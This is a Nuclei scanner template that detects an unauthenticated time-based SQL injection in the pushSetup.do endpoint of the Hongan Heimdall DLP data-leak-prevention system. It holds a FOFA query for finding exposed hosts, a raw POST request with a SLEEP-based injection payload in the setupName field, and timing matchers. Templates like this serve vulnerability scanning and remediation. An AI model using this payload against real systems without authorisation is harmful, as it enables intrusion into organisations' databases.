id: hongan-pushSetup-sqli
info:
  name: 虹安 DLP 数据泄漏防护系统 pushSetup.do sqli
  author: leadlife
  severity: high
  description: 虹安Heimdall DLP数据泄漏防护系统 pushSetup.do 接口存在SQL注入漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息。
  reference: 
    - demo
  classification:
    cve-id: 
  metadata:
    verified: true
    fofa-query: body="userReg/initUserReg.do"
  tags: 2024,sqli,time,hongan

http:
  - raw:  
      - |
        @timeout: 15s
        POST /dlp/userReg/pushSetup.do HTTP/1.1
        Host: {{Hostname}}
        Priority: u=4
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Upgrade-Insecure-Requests: 1
        Content-Type: application/x-www-form-urlencoded
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

        setupName=\{\{urlescape(1' AND (SELECT 6789 FROM (SELECT(SLEEP(3)))nxdq) AND 'vpUG'='vpUG)\}\}
      
    matchers:
      - type: dsl
        dsl:
          - contains_all(body,'Heimadll')
          - status_code == 200
          - duration >= 5 && duration < 9
        condition: and